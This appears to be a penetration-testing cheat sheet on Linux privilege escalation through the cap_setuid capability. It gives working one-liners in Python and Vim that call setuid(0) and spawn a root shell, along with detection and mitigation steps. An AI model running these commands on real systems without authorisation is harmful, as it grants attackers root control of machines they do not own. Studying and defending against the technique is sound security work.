# Privilege Escalation - Linux (Capabilities Exploit: cap_setuid)

## 🔹 Overview
**Capabilities** allow system administrators to grant specific privileges to binaries without full root access, enabling more granular control.

For example, a **SOC analyst** may need to use a tool requiring socket connections. Instead of granting full root access, the admin can modify the **capabilities** of the binary.

---

## 🔍 Detection - Identifying Binaries with Elevated Capabilities

### **Step 1: Find Binaries with Special Capabilities**
```bash
getcap -r / 2>/dev/null
```
This command lists all files with capabilities set.

Look for binaries with:
```bash
cap_setuid+ep
```
The `cap_setuid` capability allows a binary to change its user ID to root.

---

## 🔥 Exploitation - Abusing cap_setuid Capability

### **Step 1: Use Python to Escalate Privileges**
```bash
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
- `os.setuid(0)` forces the process to run as root.
- Spawns a root shell.

### **Step 2: Verify Root Access**
```bash
id
```
If successful, you should see:
```bash
uid=0(root) gid=0(root) groups=0(root)
```
🎉 Root shell obtained! 🎉

---

## 🔹 Privilege Escalation Using Capabilities

### **Example: Vim**
If Vim has elevated capabilities, it can be used to get a root shell:
```bash
getcap /usr/bin/vim
vim -c ':!/bin/sh'
```

### **Manually Assigning cap_setuid Capability to Vim**
```bash
cp $(which vim) .
sudo setcap cap_setuid+ep vim
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

## 🛡 Mitigation

### **Remove Unnecessary Capabilities**
```bash
setcap -r /usr/bin/python2.6
```

### **Best Practices**
- Use minimal privileges for binaries instead of granting `cap_setuid` globally.
- Monitor capability changes using:
  ```bash
  getcap -r / 2>/dev/null | grep cap_setuid
  ```
- Disable old Python versions if not needed.

---

## 🛠 Tools for Capability-Based Privilege Escalation
- **GTFOBins** - Exploitable binaries: [https://gtfobins.github.io/](https://gtfobins.github.io/)
- **linpeas.sh** - Automated enumeration tool for privilege escalation paths.

